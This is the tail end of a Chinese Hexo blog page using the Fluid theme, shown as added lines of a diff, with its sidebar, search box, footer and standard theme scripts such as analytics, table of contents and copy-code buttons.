+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022002247号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  
+    <script>
+        function page_time(){
+            var times = document.getElementsByTagName('time');
+            if (times.length === 0) { return; }
+            var posts = document.getElementsByClassName('post-content');
+            console.log(posts);
+            if (posts.length === 0) { return; }    
+            var pubTime = new Date(times[0].dateTime);  /* 文章发布时间戳 */
+            var now = Date.now()  /* 当前时间戳 */
+            var interval = parseInt(now - pubTime)
+            /* 发布时间超过指定时间（毫秒） */
+            if (interval > 3600*24*30*1500){
+                var days = parseInt(interval / 86400000)
+                posts[0].innerHTML = '<div class="note note-warning" style="font-size:0.9rem"><p>' +
+                '<div class="h6">文章时效性提示</div><p>这是一篇发布于 ' + days + ' 天前的文章，部分信息可能已发生改变，请注意甄别。' +
+                '</p></p></div>' + posts[0].innerHTML;
+            }
+        }
+        page_time();
+    </script>
+  
+  
+  
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?150aacf9a16405ad4ea9ead54ecac598";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
